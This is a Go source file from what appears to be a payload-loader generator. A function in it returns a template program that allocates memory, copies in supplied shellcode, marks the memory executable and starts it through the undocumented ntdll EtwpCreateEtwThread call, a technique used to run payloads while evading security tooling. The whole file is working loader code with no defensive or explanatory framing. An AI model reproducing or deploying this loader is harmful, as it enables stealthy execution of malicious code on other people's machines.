package loaders

import (
	"fmt"
)

func GetEtwpCreateEtwThreadTemplate(targetProcess string) string {
	InformProcessUnused(targetProcess)

	return fmt.Sprintf(`
package main

import (
    "syscall"
    "unsafe"
)


const (
    MEM_COMMIT                = 0x1000
    MEM_RESERVE               = 0x2000
    PAGE_READWRITE            = 0x4
    PAGE_EXECUTE_READ         = 0x20
    PAGE_EXECUTE_READWRITE    = 0x40
    CREATE_SUSPENDED          = 0x4
    CREATE_NO_WINDOW          = 0x8000000
)

var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")
    ntdll               = syscall.MustLoadDLL("ntdll.dll")

    RtlCopyMemory           = ntdll.MustFindProc("RtlCopyMemory")
    EtwpCreateEtwThread     = ntdll.MustFindProc("EtwpCreateEtwThread")

	VirtualAlloc            = kernel32.MustFindProc("VirtualAlloc")
	VirtualProtect          = kernel32.MustFindProc("VirtualProtect")
    WaitForSingleObject     = kernel32.MustFindProc("WaitForSingleObject")
)


func ExecuteOrderSixtySix(shellcode []byte) {
    /* allocating the appropriate amount of memory */
    baseAddr, _, err := VirtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ); if baseAddr == 0 {
        panic(err)
    }

    /* copying the shellcode to memory */
    _, _, _ = RtlCopyMemory.Call(
        baseAddr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )

    /* changing permissions for our memory segment */
    oldProtectCfg := PAGE_READWRITE
    _, _, _ = VirtualProtect.Call(
        baseAddr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtectCfg)),
    )

    threadId, _, err := EtwpCreateEtwThread.Call(baseAddr, uintptr(0))
    WaitForSingleObject.Call(threadId, 0xFFFFFFFF)
}
`)
}
